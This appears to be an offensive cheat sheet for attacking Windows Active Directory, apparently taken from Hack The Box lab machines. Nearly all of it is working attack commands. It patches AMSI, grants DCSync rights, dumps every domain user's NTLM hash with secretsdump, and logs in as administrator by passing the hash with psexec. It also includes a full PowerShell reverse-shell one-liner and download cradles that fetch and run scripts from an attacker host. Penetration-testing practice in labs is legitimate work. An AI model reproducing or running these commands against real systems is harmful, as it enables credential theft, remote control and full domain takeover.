# Windows

Bypass AMSI

Import PowerView first

```powershell
PS C:\Users\svc-alfresco\Documents> menu
[+] Bypass-4MSI
[+] D11-Loader
[+1 Donut-Loader
[+] Invoke-Binary
PS C:\Users\svc-alfresco\Documents> Bypass-4MST
[+] Patched! :D
PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).
downloadstring('http://10.10.14.6/PowerView.ps1')
```

Add DCSync Rights

```powershell
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

GET NTLM Hashes for all domain users

```bash
secretsdump.py htb/john@10.10.10.161
```

Pass The Hash

```bash
psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

**reverse shell.ps1**

```bash
$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,
0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.L
ength);$stream.Flush()};$client.Close()

A standard Powershell download cradle is used to execute the reverse shell. "START" is used so that the existing telnet session is not locked up. The /B parameter is specified so that a new window is not created for the shell, which has the effect that the incoming shell is able to use the full width of the screen, instead of being constrained to the telnet session display width.

START /B "" powershell -c IEX (New-Object
Net.Webclient).downloadstring('http://10.10.14.2/shell.ps1')
```







